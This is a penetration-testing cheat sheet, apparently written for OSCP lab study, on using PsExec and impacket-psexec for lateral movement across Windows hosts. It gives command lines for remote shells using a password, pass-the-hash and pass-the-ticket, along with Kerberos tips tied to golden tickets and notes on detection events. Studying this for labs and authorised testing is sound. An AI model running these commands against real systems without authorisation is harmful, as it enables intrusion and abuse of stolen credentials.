title: PsExec — Interactive Shell via ADMIN$ + Service Creation
body:
PsExec (SysInternals, by Mark Russinovich) gives you an interactive shell on a remote host using admin creds. It's the loudest of the lateral-movement options but the most reliable and the one least likely to be questioned — it's a legitimate signed Microsoft admin tool.

Three prerequisites, all default on modern Windows Server:
  1. The auth user is in the target's local Administrators group
  2. The ADMIN$ share is reachable (default on)
  3. File and Printer Sharing is on (default on)

WHAT IT DOES under the hood (this is why it's noisy):
  - Writes psexesvc.exe into C:\Windows on the target
  - Creates and starts a Windows SERVICE on the remote host
  - Runs your command as a child of psexesvc.exe
Service creation = Event 7045 = the single most-alerted lateral-movement signature. Fine on OSCP labs, loud on real engagements.

NATIVE (from a Windows foothold, official SysInternals PsExec64.exe):
  .\PsExec64.exe -i \\TARGET -u corp\jen -p Nexus123! cmd
  -i = interactive, \\TARGET = hostname (two backslashes), then domain\user / pass / command.
This gives you a real cmd.exe ON the target as the supplied user — no reverse shell, no listener needed. Capstone-friendly because output comes straight back.

FROM KALI (impacket-psexec):
  impacket-psexec corp.com/jen:'Nexus123!'@TARGET
  impacket-psexec corp.com/admin@TARGET -hashes :NTLM_HASH   # pass-the-hash variant

KEY DETAIL — hostname vs IP for Kerberos:
  - PsExec to a HOSTNAME (\\DC1) uses Kerberos when you have a ticket (e.g. after a golden ticket or overpass).
  - PsExec to an IP (\\192.168.x.x) forces NTLM — which fails if only Kerberos access is granted.
  This bites you on golden-ticket attacks: forge ticket, PsExec to the IP, 'Access denied' — switch to the hostname and it works.

WHEN TO REACH FOR IT:
  - You have admin creds (or a hash, or a ticket) and want a full interactive shell, not fire-and-forget.
  - WinRM is filtered but SMB/445 is open.
  - You want output returned directly (vs WMI's blind Win32_Process.Create).
cmd:
# ══════════════════════════════════════════════════
# NATIVE — official SysInternals PsExec64.exe (from a Windows foothold)
# ══════════════════════════════════════════════════
# Interactive shell on TARGET as a domain admin-on-that-box user:
.\PsExec64.exe -i \\FILES04 -u corp\jen -p 'Nexus123!' cmd
#   -i        interactive
#   \\FILES04 target HOSTNAME (use hostname, not IP, to allow Kerberos)
#   -u / -p   domain\user and password
#   cmd       what to run (cmd, powershell, or a specific binary)

# Verify on the shell that lands:
hostname
whoami

# ══════════════════════════════════════════════════
# FROM KALI — impacket-psexec
# ══════════════════════════════════════════════════
# With a password:
impacket-psexec corp.com/jen:'Nexus123!'@192.168.x.73

# Pass-the-hash (built-in local admin or domain account):
impacket-psexec corp.com/Administrator@192.168.x.73 -hashes :2892D26CDF84D7A70E2EB3B9F05C425E

# Pass-the-ticket (after exporting/injecting a TGT):
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.com/jen@dc1.corp.com

# ══════════════════════════════════════════════════
# KERBEROS GOTCHA — hostname vs IP
# ══════════════════════════════════════════════════
# After a golden ticket / overpass, you have Kerberos tickets but NOT NTLM access.
# PsExec to the IP forces NTLM and FAILS:
#   PsExec.exe \\192.168.50.70 cmd.exe   -> Access is denied
# PsExec to the HOSTNAME uses Kerberos and WORKS:
#   PsExec.exe \\DC1 cmd.exe             -> shell
# If you get 'Access is denied' right after forging a ticket, switch IP -> hostname.

# ══════════════════════════════════════════════════
# DETECTION FOOTPRINT
# ══════════════════════════════════════════════════
# - psexesvc.exe written to C:\Windows on target
# - Event 7045 (new service installed) — the classic PsExec alert
# - Event 5145 (ADMIN$ share access)
# Loud. Lab-fine, engagement-noisy. impacket-psexec uses a randomized service name
# but still creates a service.
warn: PsExec creates a service on the target (Event 7045) — the most-alerted lateral-movement signature there is. Fine on OSCP labs. On real engagements, prefer WMI/WinRM (no service) unless you specifically need an interactive shell, and always note service creation in your report.

choices.label: Only have a hash, not a password — pass-the-hash
Have a Kerberos ticket — overpass / pass-the-ticket
Don't want service noise — use WMI instead
Got a shell — re-enumerate as the new context
